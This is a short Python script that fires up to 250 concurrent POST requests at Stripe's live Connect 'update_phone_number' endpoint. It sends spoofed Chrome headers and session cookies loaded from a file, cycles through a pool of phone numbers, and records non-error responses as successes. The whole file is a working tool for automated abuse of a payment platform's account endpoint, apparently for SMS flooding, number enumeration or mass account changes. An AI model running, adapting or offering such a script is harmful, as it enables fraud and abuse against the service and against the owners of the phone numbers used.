import asyncio
import json
import httpx
from util import get_number, mark_used

# ========================= CONFIG =========================
URL_TARGET = "https://connect.stripe.com/ajax/light_account/update_phone_number"
MAX_CONCURRENT = 250

# Exact headers from the provided fetch request
HEADERS = {
    "accept": "*/*",
    "accept-language": "en-IN,en-US,en",
    "browser-language": "en-US,en",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "pragma": "no-cache",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "stripe-livemode": "true",
    "stripe-version": "2025-06-30.basil",
    "x-page-load-id": "bf574664-66ec-4301-aad1-8b6d456d686e",
    "x-requested-with": "XMLHttpRequest",
    "x-stripe-csrf-token": "fake-deprecated-token",
    "x-stripe-manage-client-revision": "8038346e4753992aded456f41eccaedc91a003ec",
    "referer": "https://connect.stripe.com/app/express",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
}

def load_cookies_file(filepath="cookies.json"):
    with open(filepath) as f:
        return json.load(f)

def build_cookie_header(cookies_list):
    """Convert cookie list into a 'Cookie' header string."""
    parts = [f"{c['name']}={c['value']}" for c in cookies_list]
    return "; ".join(parts)

async def worker(sem: asyncio.Semaphore, client: httpx.AsyncClient):
    while True:
        try:
            num = await get_number()
        except Exception:
            print("[*] No more numbers. Worker exiting.")
            break

        # Body: just phone_number=%2B...
        phone_param = f"%2B{num}"
        data = f"phone_number={phone_param}"

        async with sem:
            try:
                resp = await client.post(URL_TARGET, content=data)
                print(f"[{num}] Status: {resp.status_code} | Resp: {resp.text[:200]}")
                if resp.status_code not in [429, 500, 400]:
                    with open("success.txt", "a") as f:
                        f.write(f"[{num}] Success: {resp.status_code} {resp.text}\n")
            except Exception as e:
                print(f"[{num}] Request error: {e}")

        await mark_used(num)

async def main():
    cookies_list = load_cookies_file()
    cookie_header = build_cookie_header(cookies_list)

    headers = {**HEADERS, "Cookie": cookie_header}

    limits = httpx.Limits(max_connections=MAX_CONCURRENT + 5, max_keepalive_connections=MAX_CONCURRENT)
    timeout = httpx.Timeout(30.0, connect=10.0)

    async with httpx.AsyncClient(headers=headers, limits=limits, timeout=timeout) as client:
        sem = asyncio.Semaphore(MAX_CONCURRENT)
        workers = [asyncio.create_task(worker(sem, client)) for _ in range(MAX_CONCURRENT)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())